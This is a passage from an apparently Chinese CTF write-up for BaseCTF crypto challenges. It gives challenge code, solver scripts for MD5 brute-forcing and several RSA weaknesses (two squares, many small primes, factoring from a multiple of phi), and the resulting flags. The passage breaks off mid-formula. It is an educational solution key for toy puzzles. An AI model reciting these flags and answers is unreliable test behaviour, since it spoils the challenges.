&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;, &#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;, &#x27;336d5ebc5436534e61d16e63ddfca327&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;e1671797c52e15f763380b45e841ec32&#x27;, &#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;, &#x27;8277e0910d750195b448797616e091ad&#x27;, &#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;, &#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;, &#x27;0cc175b9c0f1b6a831c399e269772661&#x27;, &#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>单字符md5，可以理解为单字节加密，没有行列转换混淆的话，一般都可以直接爆破</p><p>（如果答案不对一般就是字符集的问题，整数32-126就是可见字符范围）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><br>output = [<span class="hljs-string">&#x27;9d5ed678fe57bcca610140957afab571&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;03c7c0ace395d80182db07ae2c30f034&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;0d61f8370cad1d412f80b84d143e1257&#x27;</span>, <span class="hljs-string">&#x27;b9ece18c950afbfa6b0fdbfa4ff731d3&#x27;</span>, <span class="hljs-string">&#x27;800618943025315f869e4e1f09471012&#x27;</span>, <span class="hljs-string">&#x27;f95b70fdc3088560732a5ac135644506&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;e4da3b7fbbce2345d7772b0674a318d5&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;eccbc87e4b5ce2fe28308fd9f2a7baf3&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8f14e45fceea167a5a36dedd4bea2543&#x27;</span>, <span class="hljs-string">&#x27;1679091c5a880faf6fb5e6087eb1b2dc&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27;</span>, <span class="hljs-string">&#x27;336d5ebc5436534e61d16e63ddfca327&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;8fa14cdd754f91cc6554c9e71929cce7&#x27;</span>, <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;e1671797c52e15f763380b45e841ec32&#x27;</span>, <span class="hljs-string">&#x27;a87ff679a2f3e71d9181a67b7542122c&#x27;</span>, <span class="hljs-string">&#x27;8277e0910d750195b448797616e091ad&#x27;</span>, <span class="hljs-string">&#x27;92eb5ffee6ae2fec3ad71c777531578f&#x27;</span>, <span class="hljs-string">&#x27;45c48cce2e2d7fbdea1afc51c7c6ad26&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;c9f0f895fb98ab9159f51fd0297e236d&#x27;</span>, <span class="hljs-string">&#x27;0cc175b9c0f1b6a831c399e269772661&#x27;</span>, <span class="hljs-string">&#x27;cbb184dd8e05c9709e5dcaedaa0495cf&#x27;</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> output:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">128</span>):<br>        my_md5=hashlib.md5()<br>        my_md5.update(<span class="hljs-built_in">chr</span>(j).encode())<br>        <span class="hljs-keyword">if</span>  my_md5.hexdigest() == i:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(j),end=<span class="hljs-string">&quot;&quot;</span>)<br>            <span class="hljs-keyword">break</span><br><span class="hljs-comment">#BaseCTF&#123;a4bf43a5-3ff9-4764-bda2-af8ee4db9a8a&#125;</span><br></code></pre></td></tr></table></figure><h2 id="week2"><a class="markdownIt-Anchor" href="#week2"></a> week2</h2><h3 id="two_squares"><a class="markdownIt-Anchor" href="#two_squares"></a> two_squares</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br>p=getPrime(<span class="hljs-number">128</span>)<br>q=getPrime(<span class="hljs-number">128</span>)<br>n=p*q<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br>x=p^<span class="hljs-number">2</span>+q^<span class="hljs-number">2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x =&quot;</span>,x)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">e = 65537</span><br><span class="hljs-string">c = 42330675787206041757903427737108553993012805007294570657461042152628982126538</span><br><span class="hljs-string">x = 209479773119142584969854470862023704936857416491817498021871883305658177375498</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>利用sage中的two_squares()可以很方便的进行求解<br />（此题本意就是一道环境题，导致很多新手误解，再次道个歉）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">42330675787206041757903427737108553993012805007294570657461042152628982126538</span><br>x = <span class="hljs-number">209479773119142584969854470862023704936857416491817498021871883305658177375498</span><br>p,q=two_squares(x)<br>p,q=<span class="hljs-built_in">int</span>(p),<span class="hljs-built_in">int</span>(q)<br>n=p*q<br>phin=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phin)<br>a=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,d,n)))<br><span class="hljs-built_in">print</span>(a)<br><span class="hljs-comment"># b&#x27;BaseCTF&#123;0760becd-cefaab0b094d&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="random_primes"><a class="markdownIt-Anchor" href="#random_primes"></a> random_primes</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_n</span>():<br>    primes=[getPrime(<span class="hljs-number">128</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        n *= primes[random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">127</span>)]<br>    <span class="hljs-keyword">return</span> primes,n<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span><br>m=bytes_to_long(flag)<br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(flag)==<span class="hljs-number">45</span><br><br>primes,n = gen_n()<br>e = <span class="hljs-number">0x010001</span><br><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n =&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e =&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;primes =&quot;</span>,primes)<br></code></pre></td></tr></table></figure><p>n很大很大，给了flag范围，可以得出flag为359位</p><p>素数都是128，利用3个素数（大约384位）即可比flag大</p><p>可以直接爆破</p><p>（数据太多就不贴了）</p><p>（好多师傅来问我最后为什么求出来是0，一看他们都是找出了所有素数，而且过程中都除以了n，导致最后n=1，这点需要注意）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># n =</span><br><span class="hljs-comment"># e = </span><br><span class="hljs-comment"># c = </span><br><span class="hljs-comment"># primes =</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> primes:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> primes:<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> primes:<br>            tn=i*j*k<br>            phi=(i-<span class="hljs-number">1</span>)*(j-<span class="hljs-number">1</span>)*(k-<span class="hljs-number">1</span>)<br>            m=long_to_bytes(<span class="hljs-built_in">pow</span>(c,invert(e,phi),tn))<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;BaseCTF&#x27;</span> <span class="hljs-keyword">in</span> m:<br>                <span class="hljs-built_in">print</span>(m)<br>                exit()<br></code></pre></td></tr></table></figure><h3 id="basic"><a class="markdownIt-Anchor" href="#basic"></a> basic</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socketserver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>flag = os.getenv(<span class="hljs-string">&#x27;GZCTF_FLAG&#x27;</span>).encode()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_recvall</span>(<span class="hljs-params">self</span>):<br>        BUFF_SIZE = <span class="hljs-number">2048</span><br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            part = <span class="hljs-variable language_">self</span>.request.recv(BUFF_SIZE)<br>            data += part<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(part) &lt; BUFF_SIZE:<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">return</span> data.strip()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">self, msg, newline=<span class="hljs-literal">True</span></span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> newline:<br>                msg += <span class="hljs-string">b&#x27;\n&#x27;</span><br>            <span class="hljs-variable language_">self</span>.request.sendall(msg)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">recv</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._recvall()<br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        printable_chars = string.ascii_letters + string.digits + string.punctuation<br>        optional=[<span class="hljs-string">b&#x27;A&#x27;</span>,<span class="hljs-string">b&#x27;B&#x27;</span>,<span class="hljs-string">b&#x27;C&#x27;</span>,<span class="hljs-string">b&#x27;D&#x27;</span>]<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            secret= <span class="hljs-string">&#x27;&#x27;</span>.join(random.choices(printable_chars, k=<span class="hljs-number">16</span>)).encode()<br>            select=random.choice(optional)<br>            <span class="hljs-variable language_">self</span>.send(select)<br>            enc=<span class="hljs-string">b&#x27;&#x27;</span><br>            <span class="hljs-keyword">if</span> select==<span class="hljs-string">b&#x27;A&#x27;</span>:<br>                enc=base64.b64encode(secret)<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;B&#x27;</span>:<br>                enc=secret.<span class="hljs-built_in">hex</span>().encode()<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;C&#x27;</span>:<br>                enc=bytes_to_long(secret)<br>                enc=<span class="hljs-built_in">str</span>(enc).encode()<br>            <span class="hljs-keyword">elif</span> select==<span class="hljs-string">b&#x27;D&#x27;</span>:<br>                enc=[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> secret]<br>                enc=<span class="hljs-built_in">str</span>(enc).encode()<br>            <span class="hljs-variable language_">self</span>.send(enc)<br>            client_send=<span class="hljs-variable language_">self</span>.recv()<br>            <span class="hljs-keyword">if</span> client_send!=secret:<br>                <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">&quot;\nYou wrong!!!!!&quot;</span>)<br>                exit()<br><br>        <span class="hljs-variable language_">self</span>.send(flag)<br>        <span class="hljs-variable language_">self</span>.send(<span class="hljs-string">b&quot;\nConnection has been closed  =.=  &quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.close()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadedServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ForkedServer</span>(socketserver.ForkingMixIn, socketserver.TCPServer):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-number">9999</span><br>    server = ForkedServer((HOST, PORT), Task)<br>    server.allow_reuse_address = <span class="hljs-literal">True</span><br>    server.serve_forever()<br></code></pre></td></tr></table></figure><p>一道交互题，四种加密方式</p><p>主要实现四种加密方式</p><p>A：base64</p><p>B：直接转成十六进制</p><p>C：转成整型</p><p>D：每个字符转成ascii码</p><p>主要考察pwntools的使用</p><p>（本人抽象代码，请谅解）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ast<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>rem=remote(<span class="hljs-string">&quot;&quot;</span>,)<br><br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    a=rem.recvline().decode().strip()<br>    <span class="hljs-built_in">print</span>(a,end=<span class="hljs-string">&quot; &quot;</span>)<br>    b=rem.recvline()<br>    <span class="hljs-keyword">if</span> a==<span class="hljs-string">&#x27;A&#x27;</span>:<br>        b=base64.b64decode(b)<br>    <span class="hljs-keyword">elif</span> a==<span class="hljs-string">&#x27;B&#x27;</span>:<br>        b=<span class="hljs-built_in">bytes</span>.fromhex(b.decode().strip())<br>    <span class="hljs-keyword">elif</span> a==<span class="hljs-string">&#x27;C&#x27;</span>:<br>        b=<span class="hljs-built_in">int</span>(b.decode().strip())<br>        b=long_to_bytes(b)<br>    <span class="hljs-keyword">elif</span> a==<span class="hljs-string">&#x27;D&#x27;</span>:<br>        b=ast.literal_eval(b.decode().strip())<br>        c=<span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>            c+=long_to_bytes(i)<br>        b=c<br>    <span class="hljs-built_in">print</span>(b)<br>    rem.send(b)<br><span class="hljs-built_in">print</span>(rem.recvall())<br>rem.interactive()<br></code></pre></td></tr></table></figure><h3 id="try_to_factor"><a class="markdownIt-Anchor" href="#try_to_factor"></a> try_to_factor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><br>flag=<span class="hljs-string">b&#x27;BaseCTF&#123;&#125;&#x27;</span>+random.randbytes(<span class="hljs-number">64</span>)<br>m=bytes_to_long(flag)<br><br>p,q,r,s,t=[getStrongPrime(<span class="hljs-number">512</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>)]<br>N=p*q*r*s*t<br><br>n=p*q<br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-built_in">pow</span>(m,e,n)<br><br><br>gift=random.randint(<span class="hljs-number">2</span>,n)*(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)*(s-<span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">while</span> gift%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>    gift//=<span class="hljs-number">2</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;N =&quot;</span>,N)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c =&quot;</span>,c)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gift =&quot;</span>,gift)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">N = 162692163428762295773992659007654377270271126313772302197255271375236131917158614424426498628778734679898165422129699410934825650141972454562350664161510689489443251515884304101827584411577749250383438126881931889798597627663578045519256806107514170414321556291545302688028088470848270636776466672843710163017531472049823632822203461654253767303314505996071453898533003519236112138591066133289040889933161978131399309340741554076140734156174295730180874473301361701867633594222054688204666518058106672165786417002466165926062199279674267145233283545524775943767021416906072142236079753359492846480515376121887507681663761713445807717270089017438999615422884163666812016989696908657065537508715229685120221307021151610089917537155165897740417480127289719971512938348936259</span><br><span class="hljs-string">c = 113962118676826667648935023618252851875440854724310328843964819392166304653581141146631375503931008732348730639629174670963727399860571217264854300057305570824097216782800531930906801885967717639795643406206813677461127762087560021634738167845077869308515223303820469892552545806179267969169748886980836435095</span><br><span class="hljs-string">gift = 863514692222931709925579242743251211976114217396765747601042357918763818732391790491059528595917786523674732369068315533549380754409535403506339052401422249684188032949680148055803474336983973622610403448963752802490806614810077181934627694570685722842963961551889267501616799757825675192653489096007790143775773378495299981666657347802233798206597104474595281241837323214457344961462510183726339545608046357281265026013496037522835659867389206279894057481600882665189079672009577651494435000349624334685832217586703242422260870866432379257259316411280539845741932725104662417642890238587876489774492067722351467773093391502588019563488688309892102039611978767690653206664257400163618467825666105966072942726011447079204869750153256054140924951306811971422635104088608275908232688385437145325481792836532453258784103533536292492138405929815964841772656055397705840797739586953744563989819811944946916720655079908564653686456283647030055622241840292127096994325415897266379446446435164189216562921252341705747891518007710533906231225283309180960546212899099652226954393826875</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>（此题算是临时加的，因为我做不出moectf第二周的题，想着增加点难度？所以我一开始就是准备给论文的，如果你能够认真静下心来看完论文，应该就可以解决这个问题了。论文中给出了算法流程，并不需要搞懂原理就可以出，很多师傅找的模板也是可以用的，将gift每次乘2爆破就行，我这里只是稍微改了一下希望不是拿到模板能直接出的那种。最后如果让你感到了不好的体验，我在这道个歉。</p><p>关于N和<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>进行分解的脚本，当然可以直接用，可以直接进行爆破x倍的2，然后套脚本也是可以的。我这里只是稍稍微魔改了一点。这里面也有很多脚本，感兴趣可以多看看</p><p><a href="https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py%EF%BC%89">https://github.com/jvdsn/crypto-attacks/blob/master/attacks/factorization/known_phi.py）</a></p><p>先贴一下论文<a href="https://link.springer.com/content/pdf/10.1007/3-540-36492-7_25.pdf">3-540-36492-7_25.pdf (springer.com)</a>，主要是其中的第三部分</p><p>当然看不懂论文也没事，不过可以适当看一下2-Prime和3-Prime的部分，能够按算法流程实现就可以得到flag，主要是思想。</p><p>先从后往前看，最后对flag进行了2个素数的rsa加密，给了一个gift为k倍的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>除去x倍的2。</p><p>从这里我们就可以看出来，要根据给的这个gift和之前的N来分解出p和q。</p><p>（分解出来是5个数，爆破一下就可以了）</p><p>算法流程：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" 